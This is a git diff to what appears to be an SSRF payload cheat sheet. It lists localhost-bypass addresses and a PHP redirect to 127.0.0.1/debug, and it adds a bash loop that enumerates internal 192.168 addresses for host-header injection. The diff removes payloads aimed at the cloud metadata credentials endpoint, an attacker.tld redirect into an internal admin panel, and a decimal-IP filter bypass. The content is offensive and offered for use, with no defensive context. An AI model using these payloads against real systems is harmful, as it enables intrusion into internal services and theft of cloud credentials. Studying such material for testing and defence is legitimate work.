@@ -10,6 +10,15 @@
 - IPv4-mapped IPv6 loopback address: `::ffff:127.0.0.1
 - localtest.me
 
+for a in {1..255};do
+    for b in {1..255};do
+        echo "192.168.$a.$b" >> ips.txt
+    done
+done
+and test these ib for host header inj 
+
+
+
 Create a php file and host it on server
 - ```php
 <?php header('Location: http://127.0.0.1/debug'); ?>
@@ -22,16 +31,3 @@ php -S 0.0.0.0:80
 
 then direct the url to the server
 
-## New Tricks
-
-### Trick 1
-- Scenario: Avatar URL fetch reached cloud metadata internal endpoint.
-- Payload: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
-
-### Trick 2
-- Scenario: Webhook validator followed redirect into internal admin panel.
-- Payload: `https://attacker.tld/302-to-http://127.0.0.1:8080/admin`
-
-### Trick 3
-- Scenario: Bypassed host filter using decimal IPv4 notation.
-- Payload: `http://2130706433:80/`
